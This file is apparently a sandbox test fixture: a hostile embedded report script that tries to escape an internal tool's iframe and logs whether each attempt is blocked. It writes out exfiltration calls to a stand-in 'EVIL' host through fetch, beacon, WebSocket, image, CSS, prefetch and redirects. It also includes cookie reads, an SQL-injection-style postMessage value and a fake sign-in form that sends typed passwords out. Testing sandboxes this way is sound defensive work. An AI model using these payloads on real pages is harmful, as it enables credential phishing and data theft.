// A company report that tries every way out of the box. Every line it logs must say the attempt failed.
const E = 'EVIL';
const say = (m) => console.log(`[attack] ${m}`);
const tryIt = (name, f) => {
	try {
		say(`${name}: ${f()}`);
	} catch (e) {
		say(`${name}: threw ${e.name}`);
	}
};

const rtc = () => {
	const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:UDP' }] });
	pc.createDataChannel('out');
	pc.createOffer().then((o) => pc.setLocalDescription(o));
	return 'made';
};

if (window.name === 'kid') {
	tryIt('kid rtc', rtc);
} else {
	say('ran');
	tryIt('cookie', () => document.cookie);
	tryIt('parent', () => parent.document.cookie);
	tryIt('storage', () => localStorage.length);
	tryIt('rtc', rtc);
	// Its own code again in a fresh realm, without Ops' first line.
	tryIt('kid', () => {
		const f = document.createElement('iframe');
		f.name = 'kid';
		f.srcdoc = `<script>${document.scripts[0].textContent.split('\n').slice(1).join('\n')}</${'script'}>`;
		document.body.append(f);
		return 'appended';
	});
	tryIt('fetch', () => (fetch(`${E}/fetch`).then(() => say('fetch: landed'), () => say('fetch: refused')), 'sent'));
	tryIt('beacon', () => navigator.sendBeacon(`${E}/beacon`, 'rows'));
	tryIt('socket', () => (new WebSocket(E.replace('http', 'ws') + '/socket'), 'opened'));
	tryIt('image', () => ((new Image().src = `${E}/image`), 'set'));
	tryIt('css', () => ((document.body.style.background = `url(${E}/css)`), 'set'));
	tryIt('popup', () => String(window.open(`${E}/popup`)));
	tryIt('top', () => ((top.location = `${E}/top`), 'set'));
	document.head.insertAdjacentHTML('beforeend', `<link rel="prefetch" href="${E}/prefetch"><meta http-equiv="refresh" content="2;url=${E}/refresh">`);
	setTimeout(() => tryIt('self', () => ((location.href = `${E}/self`), 'set')), 1500);

	// Rows Ops never allowed it, and a request that tries to widen an allowed one.
	addEventListener('message', ({ data }) => data?.id && say(`rows ${data.id}: ${data.error ?? `${data.rows.length} rows`}`));
	parent.postMessage({ id: 1, rows: 'personEntity' }, '*');
	parent.postMessage({ id: 2, rows: 'tallyView", personEntity --' }, '*');
	parent.postMessage({ id: 3, sql: 'SELECT * FROM personEntity' }, '*');

	// A sign-in form that looks like Ops' own, posting what is typed to the attacker.
	document.body.innerHTML = `<form action="${E}/form" method="post"><p>Your session expired. Sign in to Get Cache again.</p>
		<input name="email" placeholder="Email"><input name="password" type="password" placeholder="Password"><button>Sign in</button></form>`;
	document.forms[0].addEventListener('submit', () => fetch(`${E}/typed?${new URLSearchParams(new FormData(document.forms[0]))}`).catch(() => say('typed: refused')));
}
